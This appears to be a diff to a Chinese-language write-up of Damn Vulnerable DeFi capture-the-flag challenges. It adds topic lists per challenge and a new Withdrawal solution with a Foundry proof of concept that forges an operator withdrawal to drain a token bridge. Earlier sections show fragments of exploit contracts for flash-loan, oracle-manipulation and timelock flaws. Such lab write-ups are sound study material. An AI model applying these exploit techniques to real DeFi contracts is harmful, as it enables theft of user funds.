@@ -9,6 +9,11 @@
 過關條件:
 - 讓 flashLoan 功能失效
 
+知識點:
+-   閃電貸
+-   DOS
+
+
 解題:
 只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。
 
@@ -35,6 +40,12 @@
 - 確保 weth.balanceOf(address(receiver)) 為 0
 - 確保 weth.balanceOf(address(pool)) 為 0
 - 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。
+
+知識點:
+-   閃電貸
+-   建立攻擊合約滿足一筆交易完成攻擊
+-   MultiCall
+-   msg.data (calldata操作)
 
 解題:
 - NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 
@@ -106,6 +117,10 @@
 - 只能執行1筆交易
 - 救援資金發送至 recovery 帳戶
 
+知識點:
+-   Arbitrary call
+
+
 解題:
 - 在 floashLoan 中可以看到 target.functionCall(data); 可以執行任意calldata且target的地址可控. 可直接執行任意指令.
 
@@ -135,6 +150,10 @@
 過關條件:
 - 池子的餘額必須為0.
 - 指定的 Recovery 錢包中的餘額必須等於池子中原本的ETH數量（即 ETHER_IN_POOL）.
+
+知識點:
+- 錯誤使用 address(this).balance 當驗證方法
+
 解題:
 - flashLoan 採用非標準用法, 判斷有沒有repay只是看池子的餘額 if (address(this).balance < balanceBefore). 
 - 所以只要透過 flashLoan借款出來, 再透過deposit存回去. 就代表repay了. 然後你在合約同時有存款證明, 可執行 withdraw 就可以把$$轉出去了.
@@ -174,6 +193,9 @@ contract Exploit{
 - 分發者合約中的剩餘WETH數量必須少於1e15（也就是0.001 WETH），僅允許留下極少量的「Dust」。
 - 指定Recovery 錢包中的DVT數量必須等於總分發DVT數量（TOTAL_DVT_DISTRIBUTION_AMOUNT）減去Alice已經領取的DVT數量（ALICE_DVT_CLAIM_AMOUNT）以及分發者合約中剩餘的DVT數量。
 - 指定Recovery 錢包中的WETH數量必須等於總分發WETH數量（TOTAL_WETH_DISTRIBUTION_AMOUNT）減去Alice已經領取的WETH數量（ALICE_WETH_CLAIM_AMOUNT）以及分發者合約中剩餘的WETH數量。
+
+知識點:
+- 在 Array 更新狀態邏輯錯誤
 
 解題:
 - 基於 Merkle proofs 和 bitmaps 代幣分配合約
@@ -250,6 +272,11 @@ contract Exploit{
 過關條件:
 - 池子的DVT餘額必須為0.
 - 指定的 Recovery 錢包中的餘額必須等於池子中原本的DVT數量（即 TOKENS_IN_POOL）.
+
+知識點:
+- 閃電貸
+- 投票授權 delegate
+- 治理機制
 
 解題:
 - SelfiePool 合約中有一個 function emergencyExit() 可以把合約中所有餘額轉移. 但需要滿足 onlyGovernance 權限.
@@ -336,6 +363,11 @@ server: cloudflare
 - recovery 地址中的ETH餘額必須等於exchange的初始ETH餘額
 - player的NFT餘額必須為0
 - 預言機中的DVNFT價格必須保持不變，仍然等於初始NFT價格（INITIAL_NFT_PRICE），確保挑戰過程中沒有操縱價格
+
+知識點:
+- 錢包私鑰
+- Oralce price 設定
+
 
 解題:
 - leaked_infomation decode出來後是兩個錢包私鑰, 這兩個錢包可以設定 oracle price
@@ -453,6 +485,9 @@ Wallet address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
 - lendingPool 的DVT代幣為0
 - 將所有DVT轉到 recovery 錢包
 
+知識點:
+- 錯誤使用 balanceOf 當報價的參考
+
 解題:
 - 過去很多被駭事件, 使用合約上的餘額來當條件, 這是非常危險的且可被操控. 在PuppetPool中可以看到 _computeOraclePrice 就是使用balance來計算 oracle price.
 ```
@@ -515,6 +550,9 @@ contract Exploit {
 
 [題目](https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/): 上一個貸款池的開發者似乎吸取了教訓，並發布了新版本。現在，他們使用Uniswap v2交易所作為價格預言機，並搭配推薦的實用庫。這樣應該足夠了吧？你開始時有20 ETH和10000 DVT代幣的餘額。該池子有一百萬DVT代幣的資金面臨風險！將池子中的所有資金救出，並將它們存入指定的recovery 錢包。
 
+知識點:
+- 錯誤使用 getReserves 當報價的參考
+
 過關條件:
 - lendingPool 的DVT代幣為0
 - 將所有DVT轉到 recovery 錢包
@@ -567,6 +605,10 @@ contract Exploit {
 - 需要確保所有的NFT從recoveryManager智能合約中提取出來，並且轉移到recoveryManagerOwner的地址
 - 市場上應該不再有任何NFT待售，這表示市場中的offersCount()應該為0
 - player 的餘額必須大於或等於賞金的數量
+
+知識點:
+- Uniswap flashswap
+- Array 中 mas.value 驗證不正確
 
 解題:
 - 在買 NFT 的_buyOne function 中有一個錯誤檢查金額的地方. 只要msg.value大於priceToPay就可以通過. 
@@ -688,6 +730,10 @@ contract Exploit {
 - 用戶不再是受益人
 - 所有代幣都被轉移到 recovery 錢包
 
+知識點:
+- Safe 合約錢包
+- Proxy 合約初始化
+
 解題:
 - Safe = singletonCopy, SafeProxyFactory = walletFactory
 - create a new Safe wallet: SafeProxyFactory.createProxyWithCallback -> createProxyWithNonce -> deployProxy -> ( if callback is defined ) callback.proxyCreated
@@ -783,6 +829,7 @@ contract Exploit {
     }
 }
 ```
+
 ### Climber
 
 [題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 有一個安全金庫合約，裡面保管了1000萬個DVT代幣。該金庫是可升級的，並且遵循UUPS模式。金庫的所有者是一個timelock合約。該合約每15天可以提取有限數量的代幣。在金庫上還有一個額外的角色，擁有在緊急情況下清空所有代幣的權限。在timelock合約上，只有擁有「提議者」角色的帳戶才能安排在1小時後執行的操作。你必須從金庫中救出所有代幣並將其存入指定的恢復帳戶。
@@ -790,6 +837,10 @@ contract Exploit {
 過關條件:
 - 搶救金庫資產
 - 所有代幣都被轉移到 recovery 錢包
+
+知識點:
+- Timelock 機制
+
 
 解題:
 - 在正常情況下, schedule 應該先被調用, 隨後等待時間延遲（TimeLock），並最終透過 execute 執行這些操作, 但是在 execute() 存在一個邏輯漏洞在於執行順序的不當：操作應在檢查通過後執行，而不是執行後再檢查。這使得惡意操作能夠繞過檢查，並直接對合約的狀態進行更改。正確的修復方式是將 getOperationState(id) 檢查移到操作執行之前，從而確保只有合法且已規劃的操作才能執行。
@@ -818,6 +869,9 @@ function execute(address[] calldata targets, uint256[] calldata values, bytes[] 
     operations[id].executed = true;
 }
 ```
+![Screenshot_2024-09-05_at_9_27_53 AM](https://hackmd.io/_uploads/SJKtctLnA.png)
+
+
 
 - 過關流程: grantRole 拿到 PROPOSER_ROLE -> updateDelay to 0 -> transferOwnership -> timelockSchedule -> upgrade contract -> withdraw -> done
 
@@ -898,7 +952,6 @@ address = keccak256(address(deployer), nonce);
 // CREATE2
 address = keccak256(0xFF, sender, salt, bytecode);
 ```
-
 ### Puppet V3
 
 [題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 無論是熊市還是牛市，真正的 DeFi 開發者都會持續建設。還記得你之前幫助過的那個借貸池嗎？他們現在推出了新版本。他們現在使用 Uniswap V3 作為預言機。沒錯，不再使用現貨價格！這次借貸池查詢的是資產的時間加權平均價格，並且使用了所有推薦的庫。Uniswap 市場中有 100 WETH 和 100 DVT 的流動性。借貸池裡有一百萬個 DVT 代幣。你從 1 ETH 和一些 DVT 開始，必須拯救所有人於這個存在漏洞的借貸池。別忘了將它們發送到指定的恢復帳戶。注意：此挑戰需要有效的 RPC URL，以便將主網狀態分叉到你的本地環境。
@@ -907,6 +960,9 @@ address = keccak256(0xFF, sender, salt, bytecode);
 - 必須在 block.timestamp - initialBlockTimestamp < 115 秒內完成
 - 借貸池（lendingPool）中的代幣餘額必須為零
 - 所有LENDING_POOL_INITIAL_TOKEN_BALANCE代幣都被轉移到 recovery 錢包
+
+知識點:
+- Uniswap TWAP 時間加權平均價格預言機
 
 解題:
 - 要注意 calculateDepositOfWETHRequired 拿到的報價會是3倍價格.
@@ -917,8 +973,7 @@ address = keccak256(0xFF, sender, salt, bytecode);
         return quote * DEPOSIT_FACTOR;
     }
 ```
-- Pool 裡有 100 個 WETH 和 100 個 DVT 代幣，流動性較小,PuppetV3Pool.sol合約使用了10分鐘的TWAP期來計算DVT代幣的價格, 這個設定使合約容易受到價格操控攻擊的影響
-, 無需付出太多成本! 有了這個方法後, 我們可以透過我們擁有的 110 DVT 代幣換成 WETH, 使 DVT 代幣變得超級便宜. 因為oracle會根據過去10分鐘的價格數據來計算當前價格。然而，由於TWAP期較短，只需在這10分鐘內大幅度操作交易（如大筆兌換DVT），即可顯著影響報價. 由於TWAP是一種延遲報價機制，在操控價格後，有一個短暫的時間窗口（例如110秒）讓攻擊者利用降低的價格進行不公平的借貸。這個時間窗口允許攻擊者在TWAP價格尚未恢復到正常水平之前，最大化利用這個價格差距來實現獲利.
+- Pool 裡有 100 個 WETH 和 100 個 DVT 代幣，流動性較小,PuppetV3Pool.sol合約使用了10分鐘的TWAP期來計算DVT代幣的價格, 這個設定使合約容易受到價格操控攻擊的影響, 無需付出太多成本! 有了這個方法後, 我們可以透過我們擁有的 110 DVT 代幣換成 WETH, 使 DVT 代幣變得超級便宜. 因為oracle會根據過去10分鐘的價格數據來計算當前價格。然而，由於TWAP期較短，只需在這10分鐘內大幅度操作交易（如大筆兌換DVT），即可顯著影響報價. 由於TWAP是一種延遲報價機制，在操控價格後，有一個短暫的時間窗口（例如110秒）讓攻擊者利用降低的價格進行不公平的借貸。這個時間窗口允許攻擊者在TWAP價格尚未恢復到正常水平之前，最大化利用這個價格差距來實現獲利.
 
 [POC](./damn-vulnerable-defi/test/puppet-v3/PuppetV3.t.sol) :
 
@@ -950,6 +1005,7 @@ console.log("beofre quote: ", quote1); //quote:3000000000000000000000000
         token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 ```
+
 
 ### ABI Smuggling
 
@@ -1094,6 +1150,7 @@ Memory loc      Data
 0x40            48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // actual value
 If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".
 ```
+
 ### Shards
 
 [題目](https://www.damnvulnerabledefi.xyz/challenges/shards/): Shards NFT 市場是一個無需許可的智能合約，允許 Damn Valuable NFT 的持有者以任何價格（以 USDC 表示）出售這些 NFT。這些 NFT 可能非常有價值，以至於賣家可以將它們拆分成較小的份額（稱為 “shards”）。買家可以購買這些 shards，這些份額以 ERC1155 代幣形式表示。只有當整個 NFT 售出後，市場才會向賣家付款。市場向賣家收取 1% 的手續費，並以 Damn Valuable Tokens (DVT) 支付。這些 DVT 可以存放在安全的鏈上金庫中，而該金庫與 DVT 的質押系統整合。有人正在出售一個 NFT，價格高達……哇，一百萬 USDC？在那些瘋狂的玩家發現之前，你最好先深入研究這個市場。你一開始沒有任何 DVT，請儘量在一次交易中救回資金，並將資產存入指定的回收帳戶。
@@ -1162,4 +1219,155 @@ contract Exploit {
         token.transfer(recovery,token.balanceOf(address(this)));
     }
 }
+```
+
+### Curvy Puppet
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/curvy-puppet/): 這裡有一個借貸合約，任何人都可以從 Curve 的 stETH/ETH 池中借出 LP 代幣。為了這麼做，借款人必須首先存入足夠的 Damn Valuable 代幣 (DVT) 作為抵押。如果借款頭寸的價值超過了抵押品的價值，任何人都可以透過償還債務並奪取所有抵押品來清算它。該借貸合約整合了 Permit2 來安全管理代幣授權。它還使用了一個受限的價格預言機來獲取 ETH 和 DVT 的當前價格。Alice、Bob 和 Charlie 都在借貸合約中開立了頭寸。為了格外安全，他們決定將頭寸大幅過度抵押。但他們真的安全嗎？這不是開發者收到的緊急漏洞報告中所聲稱的。在使用者資金被奪走之前，關閉所有頭寸並取回所有可用的抵押品。
+
+開發者已經提供了部分庫存資金以備你在操作中需要使用：200 WETH 和略超過 6 個 LP 代幣。不用擔心利潤，但不要耗盡他們的資金。另外，請確保將任何救回的資產轉移到庫存賬戶。
+注意：此挑戰需要一個有效的 RPC URL，以將主網狀態分叉到你的本地環境。
+
+過關條件:
+- 所有用戶的部位都被清算
+- Treasury 仍有剩餘資金
+- Player 餘額為0
+
+知識點:
+-   read only reentrancy
+
+解題:
+-
+    
+### Withdrawal
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/withdrawal/): 
+有一個代幣橋用來將 Damn Valuable Tokens (DVT) 從 L2 提領到 L1，該橋上有一百萬 DVT 代幣的餘額。L1 端的代幣橋允許任何人在延遲期過後，並且提供有效的默克爾證明時，完成提領。該證明必須與代幣橋所有者設定的最新提領根對應。你收到了一個包含 4 筆在 L2 發起的提領的事件日誌的 JSON 檔案。這些提領可以在 7 天延遲期過後執行。但其中有一筆可疑的提領，不是嗎？你可能需要仔細檢查，因為所有資金可能都處於風險之中。幸運的是，你是一名具有特殊權限的橋樑操作員。透過完成所有給定的提領，防止可疑的那一筆執行，並且確保不會耗盡所有資金來保護這座橋樑。
+
+過關條件:
+- L1 Token Bridge 保留大部分的代幣至少是 99%
+- Player 地址的代幣餘額必須為 0
+- L1 Gateway 的 counter() 值必須大於或等於 WITHDRAWALS_AMOUNT，表示足夠多的提領已完成。
+- 以下四個提領的 ID 必須都已被標記為完成：
+hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"（第一筆提領）
+hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"（第二筆提領）
+hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"（第三筆提領）
+hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"（第四筆提領）
+
+知識點:
+-  跨鏈交易 L2 -> L1
+    -  L2Handler.sendMessage：在 L2 上，L2Handler 發送跨鏈訊息
+    -  L1Forwarder.forwardMessage：在 L1 上，L1Forwarder 轉發訊息
+    -  L1Gateway.finalizeWithdrawal：L1Gateway 確認提領，完成跨鏈操作
+    -  TokenBridge.executeTokenWithdrawal：TokenBridge 執行代幣轉移，將代幣發送給接收者。
+-  Calldata decode
+
+解題:
+- 題目給了 withdrawals.json, 裡面是 MessageStored L2 打到L1的4筆log.
+MessageStored的 event signature 是 0x43738d03
+透過 keccak256("MessageStored(bytes32,uint256,address,address,uint256,bytes)") 前4bytes得到的.
+- 再來要decode一下data. 看看裡面有什麼操作
+
+```
+eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
+0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
+0000000000000000000000000000000000000000000000000000000000000060 // data.offset
+0000000000000000000000000000000000000000000000000000000000000104 // data.length
+01210a38                                                         // L1Forwarder.forwardMessage.selector
+0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
+000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
+0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
+0000000000000000000000000000000000000000000000000000000000000080 // message.offset
+0000000000000000000000000000000000000000000000000000000000000044 // message.length
+81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
+000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
+0000000000000000000000000000000000000000000000008ac7230489e80000 // amount (10e18)
+0000000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+```
+- L1Gateway.finalizeWithdrawal 如果是 Operator 不檢查 MerkleProof. 而且 player 有 Operator role. 這邊就可以偽造請求. 來把 token bridge的代幣提走, 我們可以先搶救  900000. 
+- 過關條件還要把withdrawals.json裡面的4筆交易狀態需要是finalized, 所以要把這4筆透過 L1Gateway.finalizeWithdrawal 發送一次. 因為我們先搶救了 900000 儘管4筆請求的第3筆轉移資產 999000 會造成轉帳失敗, 但是這個沒有在狀態檢查內, 導致整的交易不會被revert.
+![Screenshot 2024-09-06 at 3.35.56 PM](https://hackmd.io/_uploads/H1Oy-NO3A.png)
+ 
+- 最後再把救援的token,還給tokenBridge.
+
+[POC](./damn-vulnerable-defi/test/withdrawal/Withdrawal.t.sol) :
+
+```
+    function test_withdrawal() public checkSolvedByPlayer {
+
+        // fake withdrawal operation and obtain tokens
+        bytes memory message = abi.encodeCall(
+            L1Forwarder.forwardMessage,
+            (
+                0, // nonce
+                address(0), //  
+                address(l1TokenBridge), // target
+                abi.encodeCall( // message
+                    TokenBridge.executeTokenWithdrawal,
+                    (
+                        player, // deployer receiver
+                        900_000e18 //rescue 900_000e18
+                    )
+                )
+            )
+        );
+
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce
+            l2Handler, // pretend l2Handler 
+            address(l1Forwarder), // target is l1Forwarder
+            block.timestamp - 7 days, // to pass 7 days waiting peroid
+            message, 
+            new bytes32[](0)   
+        );
+
+        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
+        
+        vm.warp(1718786915 + 8 days);
+        // first finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce 0
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718786915, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+
+        // second finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            1, // nonce 1
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718786965, // timestamp
+            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+
+        // third finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            2, // nonce 2
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718787050, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+
+        // fourth finalizeWithdrawal
+        l1Gateway.finalizeWithdrawal(
+            3, // nonce 3
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718787127, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
+            new bytes32[](0)    // Merkle proof
+        );
+ 
+        token.transfer(address(l1TokenBridge),900_000e18);
+        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
+        
+    }
+    
 ```
